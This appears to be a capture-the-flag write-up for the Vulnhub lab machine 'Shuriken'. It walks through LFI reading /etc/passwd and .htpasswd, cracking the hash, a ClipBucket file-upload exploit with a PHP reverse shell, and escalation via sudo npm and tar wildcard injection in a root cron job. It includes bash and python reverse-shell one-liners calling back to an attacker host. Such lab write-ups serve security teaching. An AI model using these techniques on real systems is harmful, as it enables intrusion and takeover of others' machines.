This is an intermediate box from Vulnhub. It is hackthebox-like. It is a really good challenge, would definitely recommend ðŸ˜›.

#### In secret:

There is image:

![](/assets/images/shuriken/s2.png)

Nothing in the image itself. It is a hint about checking the JS scripts.

  

#### Checking the JS Scripts:

In index\_\_7ed54732.js

```
  t.p = 'http://broadcast.shuriken.local',
```

Added the following to /etc/hosts:

```
192.168.56.129	broadcast.shuriken.local
```

You get a authentication dialog when you try to visit the site:

![](/assets/images/shuriken/s3.png)

So you should probably find credentials first.

  

In the other js file (index\_\_d8338055.js"):

```
n.p = 'http://shuriken.local/index.php?referer=',
```

Try to add that to /etc/hosts instead:

```
192.168.56.129	shuriken.local
```

  

#### Local File Inclusion:

We can perform LFI with referer param:

We test the following and it appears in the page source

```
crazyeights@es-base:~$ curl http://shuriken.local/index.php?referer=../js/index__7ed54732.js
```

Getting the passwd file, you must use double slashes because single slashes (../) are removed.

```
http://shuriken.local/index.php?referer=..//..//..//..//etc/passwd
```

![](/assets/images/shuriken/s4.png)  

Find the password for the HTTP Authentication by checking for a htpasswd file:

```
crazyeights@es-base:~$ curl http://shuriken.local/index.php?referer=..//..//..//etc/apache2/.htpasswd
```

On the resulting page:

```
developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
```

  

#### Crack with john:

```
crazyeights@es-base:~$ john --wordlist=lists/rockyou.txt --rules  shuriken_hash 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
9972761drmfsls   (developers)
```

We now have credentials: developers:9972761drmfsls

Change the line back in the hosts file so you can log in

```
192.168.56.129	broadcast.shuriken.local
```

We can see it is running ClipBucket version 4

![](/assets/images/shuriken/s5.png)  

### ClipBucket Exploit:

Using searchsploit we find the following:

`ClipBucket < 4.0.0 - Release 4902 - Command I | php/webapps/44250.txt`

  

It is vulnerable to CMD Injection, File Upload, and SQLI

```
Proof of concept:
-----------------
1. Unauthenticated OS Command Injection
Without having to authenticate, an attacker can exploit this vulnerability
by manipulating the "file_name" parameter during the file upload in the script
/api/file_uploader.php:

 $ curl -F "Filedata=@pfile.jpg" -F "file_name=aa.php ||<<COMMAND HERE>>"
http://$HOST/api/file_uploader.php

2. Unauthenticated Arbitrary File Upload
Below is the cURL request to upload arbitrary files to the webserver with no
authentication required.

$ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
"http://$HOST/actions/beats_uploader.php"

$ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
"http://$HOST/actions/photo_uploader.php"

```

  

*   Command injection doesn't work

*   Trying file upload, using php-reverse-shell, and the u param for the HTTP Authentication

First start the listener

```
nc -lvp 1234
```

  

```
crazyeights@es-base:~/tools$ curl -F "file=@php-reverse-shell.php" -F "plupload=1" -F "name=rshell.php" "http://broadcast.shuriken.local/actions/beats_uploader.php" -u developers:9972761drmfsls

creating file{"success":"yes","file_name":"16091743966af9ed","extension":"php","file_directory":"CB_BEATS_UPLOAD_DIR"}
```

Go to the location of the uploaded file to run the script. The filename is randomly generated, and returned in the response from the server.

### Privilege Escalation:

Now that we have a session as user www-data we can find user and root flags.

**Checking if www-data can execute anything with elevated permissions:**

```
?>$ sudo -l
Matching Defaults entries for www-data on shuriken:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on shuriken:
    (server-management) NOPASSWD: /usr/bin/npm
$ 
```

www-data can run npm with the permissions of the user server-management without a password. Use npm script functionality to get a shell.

```
$ cd /tmp
$ npm init
[SNIP]
{
  "name": "tmp",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "author": "",
  "license": "ISC"
}
[SNIP]
```

Creating a command to add a script for the shell:

```
echo $(cat package.json | grep -v "}" | grep -v auth | grep -v lice; echo ',"shell": "/bin/bash"},'; cat package.json | grep 'auth\|lice'; echo "}") > package.json
```

The resulting file:

```
$ cat package.json
{ "name": "tmp", "version": "1.0.0", "description": "", "main": "index.js", "scripts": { "test": "echo \"Error: no test specified\" && exit 1" ,"shell": "/bin/bash"}, "author": "", "license": "ISC" }
```

Running the npm script as user server-management:

```
$ sudo -u server-management npm install
$ sudo -u server-management npm run-script shell

> tmp@1.0.0 shell /tmp
> /bin/bash

id
uid=1000(server-management) gid=1000(server-management) groups=1000(server-management),24(cdrom),30(dip),46(plugdev),116(lpadmin),122(sambashare)
```

#### Getting the user flag:

With the user server-managment we can get the user flag:
```
ls /home/server-management
Desktop
Documents
Downloads
Music
Pictures
Public
Shuriken
Templates
Videos
user.txt
cat /home/server-management/user.txt
67528b07b382dfaa490f4dffc57dcdc0
```

#### Getting root:

Noticed that there were these reports in Documents, thought there might be a job to back them up:

```
/home/server-management/Documents:
Daily Job Progress Report Format.pdf
Employee Search Progress Report.pdf
```

Finding the job:

```
cat /etc/crontab
 # /etc/crontab: system-wide crontab
 # Unlike any other crontab you don't have to run the `crontab'
 # command to install the new version when you edit this file
 # and files in /etc/cron.d. These files also have username fields,
 # that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

 # m h dom mon dow user	command
*/2   * * * *	root	/var/opt/backupsrv.sh
[SNIP]
```

#### The Cronjob Script:

Notice the use of wildcards. That can be used to execute a script with checkpoint-action

See: https://gtfobins.github.io/gtfobins/tar/

```
cat /var/opt/backupsrv.sh
 #!/bin/bash

 # Where to backup to.
dest="/var/backups"

 # What to backup. 
cd /home/server-management/Documents
backup_files="*"

 # Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

 # Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

 # Backup the files using tar.
tar czf $dest/$archive_file $backup_files

 # Print end status message.
echo
echo "Backup finished"
date

 # Long listing of files in $dest to check file sizes.
ls -lh $dest

```

Create the files:

```

echo "bash -i >& /dev/tcp/192.168.56.1/9999 0>&1" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh" 
echo "" > "--checkpoint=1"

ls
--checkpoint-action=exec=sh shell.sh
--checkpoint=1
Daily Job Progress Report Format.pdf
Employee Search Progress Report.pdf
shell.sh
```

The bash reverse shell didn't work, switched to python reverse shell:

```
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.56.1\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > shell.sh
```

Start the listener

```
crazyeights@es-base:~$ nc -lvp 9999
    listening on [any] 9999 ...
```

Waiting two minutes....

```
crazyeights@es-base:~$ nc -lvp 9999
listening on [any] 9999 ...
connect to [192.168.56.1] from broadcast.shuriken.local [192.168.56.129] 51784

 # id
